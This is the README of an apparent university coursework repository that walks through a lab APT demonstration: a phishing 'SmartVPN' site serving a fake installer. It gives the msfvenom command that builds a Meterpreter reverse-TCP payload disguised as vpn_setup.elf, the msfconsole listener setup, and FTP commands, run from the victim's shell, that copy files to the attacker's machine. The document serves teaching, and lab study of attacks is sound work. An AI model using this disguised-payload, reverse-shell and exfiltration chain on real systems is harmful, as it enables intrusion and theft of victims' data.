## SmartVPN

This is a repository containing code for demonstration of APT attacks for Introduction to Cyber Security Coursework @ IIIT Sricity.

This repo contains the server-side rendering code for a phishing website called as Smart VPN which has a maliicous .elf executable file as vpn_setup.elf which as the name suggests, is a fake VPN setup file which if executed, can open a connection to the attacker and spawn a shell of the victim's machine at the attacker's end.

We are setting up a reverse shell on the victim's computer which will connect to the attacker's machine which is listening to the connection request from any machine after the malicious file has been sent!

Note: This is only for educational purposes!


## Project Contributors

- Pranauv Kumar - S20210010186
- Rahul Agarwal - S20210010187
- Sai Swetha M - S20210010143
- Anurag Yadav - S20210010026

## Some Information on APT

APTs are sophisticated, targeted cyber attacks
conducted by well-funded and highly skilled threat
actors.

One reknowned example of APT is APT28 -it is associated
with Russian state-sponsored hacking groups.

There are 5 Steps in APT :-
1) Reconnaisance and Weaponization - This is where where attacker collect information about the target organization by investigating its employees, partners, or customers and makes a malicious weapon well-crafted for one particular target inside the organization!
2) Delivery and Initial Intrusion - This is where they send the malware into the system inside a network they want to hack (thru various methods like Phishing mails, Water Holing Attack, etc) and get hold of a computer in the org's network.
3) Command and Control - This is where the attacker sets up Remote Access Tools / Backdoors in the victim's computer to access his computer when the host program is not running also.
4) Lateral Movement - This is where the attacker maps the org's devices through one compromised device and travels between them to get as much information as possible ( in a very slow manner so as to not alert the systems )
5) Data Exfiltration - This is where the collected data is sent to the attacker through any means like social media websites, file transfers, etc.

## How to Make It Work!

For demonstration, we need two Virtual Machines - Kali Linux and Ubuntu Linux default setup with FTP servers (VSFTPD preferably - installation not in the scope of this repository).

Note, here we are having 2 VMs in the same network for ease of demonstration and the IP addresses are on the basis of that!

Kali's IP - 192.168.100.4 and Ubuntu's IP - 192.168.100.5

In Kali Linux,

Firstly, Clone the project to have the Fake VPN Website ready for the victim to download the malicious VPN setup file. 

```bash
git clone https://github.com/Pranauv-Kumar1803/ICS.git
```

Go to the project directory

```bash
cd ICS
```

Install dependencies in both client and server folder

```bash
npm install
```

Start the server

```bash
npm start
```

Next, create the malicious .elf executable file using msfvenom toolkit. The code is as given below:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=4443 -f elf > vpn_setup.elf
```

Then, setup the Listener using msfconsole (Listen on the same host ip address and port as mentioned in the creatino of the .elf file code above):
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.100.4
set lport 4443
exploit
```

Now that the listener is up and running in the Kali, we go for Ubuntu.

From here, we access the SmartVPN website that is hosted on "192.168.100.4:8000" and download the vpn setup from the website and we run it!

Boom! Now, we have a hit in Kali Linux's Listener inside msfconsole and now we can access the victim's computer through the shell that was spawned!

After this, to just show the data exfiltration part, we use FTP to connect to the attacker's computer from the victim's shell in the msfconsole to exfiltrate some data (some random dummy.pdf files from victim's computer)

To do this, type the following in the shell spawned in the Kali Linux's Msfconsole,

```bash
shell
bash
ftp 192.168.100.4  #and enter kali's ftp password when prompted
put dummy.pdf ./   #to transfer dummy.pdf from victim's to attacker's computer
```

"put" command of FTP, sees the "dummy.pdf" in the main/default directory of ftp User in Ubuntu and transfers it to the default directory of Kali's ftp user.

Hence, we are done with the whole demonstration of APT!
